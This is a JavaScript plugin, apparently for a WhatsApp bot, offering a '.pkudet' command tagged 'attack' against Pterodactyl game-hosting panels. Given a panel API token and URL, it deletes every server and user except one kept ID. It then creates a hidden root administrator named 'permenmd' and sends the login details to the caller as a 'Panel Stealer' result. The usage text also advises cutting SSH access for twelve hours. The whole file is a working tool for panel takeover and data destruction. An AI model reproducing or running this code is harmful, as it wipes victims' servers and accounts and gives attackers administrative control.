let passwordaseli = '';

const generateRandomPassword = () => {
    passwordaseli = 'Permen' + Math.random().toString(36).substring(7);
};

const PermenReset = async (apiKey, panelUrl, userIdToKeep) => {
    const headers = {
        'Content-Type': 'application/json',
        'Accept': 'Application/vnd.pterodactyl.v1+json',
        'Authorization': `Bearer ${apiKey}`
    };

    const fetchJson = async (url, options = {}) => {
        console.log(`Fetching URL: ${url}`);
        const response = await fetch(url, { headers, ...options });
        const text = await response.text();

        if (!response.ok) {
            if (response.status === 401) {
                throw new Error("\`Plta\` Nya \`Invalid\` Gblok");
            } else if (response.status === 403) {
                throw new Error("\`Plta\` Nya \`Gak Full Mid\` Ini Anjeng");
            } else if (response.status === 502) {
                throw new Error("Panel Mu \`Kena DDoS\` Kang Gabisa Di Akses Nih");
            }
        }

        try {
            return JSON.parse(text);
        } catch (error) {
            console.error(`Failed to parse JSON response from ${url}: ${text}`);
        }
    };

    const getAllItems = async (endpoint) => {
        const data = await fetchJson(`${panelUrl}/api/application/${endpoint}`);
        return data?.data || [];
    };

    const deleteServer = async (serverId) => {
        await fetchJson(`${panelUrl}/api/application/servers/${serverId}`, { method: 'DELETE' });
        console.log(`Deleted server ID: ${serverId}`);
    };

    const deleteUser = async (userId) => {
        await fetchJson(`${panelUrl}/api/application/users/${userId}`, { method: 'DELETE' });
        console.log(`Deleted user ID: ${userId}`);
    };

    const createAdminUser = async () => {
        const newUser = {
            username: 'permenmd',
            email: 'permenmd@reset.com',
            first_name: 'permenmd',
            last_name: 'stars',
            password: passwordaseli,
            root_admin: true,
            language: 'en'
        };
        return fetchJson(`${panelUrl}/api/application/users`, {
            method: 'POST',
            body: JSON.stringify(newUser)
        });
    };

    const servers = await getAllItems('servers');
    servers.forEach(async (server) => {
        if (server.attributes.user_id !== parseInt(userIdToKeep)) {
            await deleteServer(server.attributes.id);
        }
    });

    const users = await getAllItems('users');
    users.forEach(async (user) => {
        if (user.attributes.id !== parseInt(userIdToKeep)) {
            await deleteUser(user.attributes.id);
        }
    });

    const newAdminUser = await createAdminUser();
    return `Deleted all servers and users. Created new admin user: ${newAdminUser.attributes.username}, ID: ${newAdminUser.attributes.id}`;
};

let handler = async (m, { text }) => {
    generateRandomPassword()
    const permen = text.split('|').map(arg => arg.trim());
    const apiKey = permen[0];
    const panelUrl = permen[1];
    const userIdToKeep = permen[2];

    if (permen.length < 3) {
        m.reply(`*Kudeta Panel Ambil Token Plta Dulu Sama Lihat User ID Akun mu agar tidak ikut kehapus, Setelah Kudet Dimohon Kill SSH 42000 Detik = 12 Jam*\n\n\`\`\`Example Use: .pkudet plta|link|userid\`\`\``);
        return;
    }

    m.reply(`\`\`\`Processing...\`\`\`\n\`Target:\` ${panelUrl}\n\`Keep ID:\` ${userIdToKeep}\n\`Token:\` ${apiKey}\n\nIf The Stealer Finished Data Will Be Send To You`);

    try {
        const progress = await PermenReset(apiKey, panelUrl, userIdToKeep);
        m.reply(progress);
        const thumb = `https://telegra.ph/file/4cdf65fd313141586dfcf.jpg`;
        const resultn = `Panel Stealer Access By PermenMD
        \`Target:\` ${panelUrl}
        \`Keep ID:\` ${userIdToKeep}
        
        \`New User:\` permenmd
        \`Mail:\` permenmd@reset.com
        \`Password:\` ${passwordaseli}`;
        conn.sendMessage(m.sender, {
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `Panel Has Been Stealed`,
                    body: `New Details`,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnailUrl: thumb,
                    sourceUrl: ``
                }
            }, 
            text: resultn
        }, { quoted: m });
        
    } catch (error) {
        m.reply(error.message);
    }
};

handler.help = ['pkudet']
handler.tags = ['attack'];
handler.premium = true
handler.command = /^(pkudet)$/i;
module.exports = handler